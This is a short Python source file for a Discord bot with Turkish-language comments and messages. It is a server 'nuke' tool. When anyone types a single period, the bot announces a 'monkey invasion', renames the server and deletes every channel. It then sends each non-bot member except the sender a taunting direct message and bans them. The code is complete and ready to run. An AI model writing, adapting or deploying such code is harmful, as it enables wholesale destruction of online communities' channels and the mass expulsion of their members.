import os
import discord
from discord.ext import commands

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot aktif: {bot.user.name}")

@bot.event
async def on_message(message):
    if message.author == bot.user or not message.guild:
        return

    if message.content.strip() == ".":
        guild = message.guild

        # 1. Uyarı mesajı at
        try:
            await message.channel.send("🚨 **Maymunlar serbest bırakıldı!** Sunucu temizlik operasyonu başlıyor... 🐵💥")
        except Exception as e:
            print(f"⚠️ Uyarı mesajı hatası: {e}")

        # 2. Sunucu adını değiştir
        try:
            await guild.edit(name="Maymun Sunucusu 🐵")
            print("📛 Sunucu adı değiştirildi.")
        except Exception as e:
            print(f"⚠️ İsim değiştirme hatası: {e}")

        # 3. Tüm kanalları sil
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"🗑️ Silindi: {channel.name}")
            except Exception as e:
                print(f"⚠️ Kanal silme hatası: {e}")

        # 4. Herkese özelden DM gönder ve ardından banla
        for member in guild.members:
            if member != message.author and not member.bot:
                try:
                    # DM gönder
                    dm = await member.create_dm()
                    await dm.send("🐒 **Maymunlar size skrim yapıyor! Hazır olun!** 💥")
                    print(f"📩 DM gönderildi: {member.name}")
                except Exception as e:
                    print(f"⚠️ DM hatası: {member.name} - {e}")
                try:
                    # Banla
                    await member.ban(reason="Maymun istilası nedeniyle uzaklaştırıldı")
                    print(f"🚫 Banlandı: {member.name}")
                except Exception as e:
                    print(f"⚠️ Ban hatası: {member.name} - {e}")

    await bot.process_commands(message)